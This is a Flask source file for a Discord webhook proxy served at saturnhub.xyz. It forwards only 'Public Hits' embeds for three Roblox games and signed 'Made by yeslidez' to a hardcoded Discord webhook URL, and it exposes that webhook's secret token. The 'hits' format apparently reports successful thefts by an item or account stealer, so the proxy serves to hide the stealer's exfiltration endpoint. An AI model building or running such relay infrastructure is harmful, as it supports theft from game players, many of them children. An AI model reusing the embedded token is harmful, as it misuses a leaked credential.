from flask import Flask, request, jsonify
from flask_cors import CORS
import requests, time, string, random, os

app = Flask(__name__)
CORS(app)

# 🔒 Your hardcoded Discord webhook
REAL_WEBHOOK = "https://discord.com/api/webhooks/1361375001822888056/EQhKNkjyT2WhwH1_s4NbReCdEiD-oTR-vJWoUI-DQ3SyVQs9--IaAQvn0nzM6C0b71D9"

webhook_map = {}
ip_registry = {}
LIMIT_SECONDS = 40  # Cooldown per IP

def generate_token(length=6):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

@app.route("/")
def home():
    return "", 204  # Empty homepage

@app.route("/webhook/<token>", methods=["POST"])
def handle_webhook(token):
    if token not in webhook_map:
        return "", 204  # Invalid token

    # Get real client IP
    forwarded_for = request.headers.get("X-Forwarded-For")
    if forwarded_for:
        client_ip = forwarded_for.split(",")[0].strip()
    else:
        client_ip = request.remote_addr

    key = f"{token}:{client_ip}"

    # IP Cooldown Check
    if key in ip_registry and time.time() - ip_registry[key] < LIMIT_SECONDS:
        return "", 204

    data = request.json
    if not data or "embeds" not in data:
        return "", 204

    # ✅ Strict embed validation
    allowed = False
    if (
        data.get("content") == "Wow someone got a hit"
        and len(data["embeds"]) == 1
    ):
        embed = data["embeds"][0]
        title = embed.get("title", "")
        footer = embed.get("footer", {})

        if (
            title in ["BGSI Public Hits", "MM2 Public Hits", "ADM Public Hits"]
            and isinstance(footer, dict)
            and footer.get("text", "").startswith("Made by yeslidez - ")
        ):
            allowed = True

    if not allowed:
        return "", 204

    # Send and log timestamp
    ip_registry[key] = time.time()
    response = requests.post(webhook_map[token], json=data)
    return jsonify({
        "status": "sent",
        "discord_status": response.status_code
    })

# 🔐 Block all other HTTP methods for /webhook/<token>
@app.route("/webhook/<token>", methods=["DELETE", "PUT", "PATCH", "OPTIONS"])
def block_other_methods(token):
    return "", 405  # Method Not Allowed

if __name__ == "__main__":
    token = "a8dfndf"
    webhook_map[token] = REAL_WEBHOOK

    print("\n✅ Webhook Proxy is Ready!")
    print(f"Send POST requests to: https://saturnhub.xyz/webhook/{token}\n")

    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)
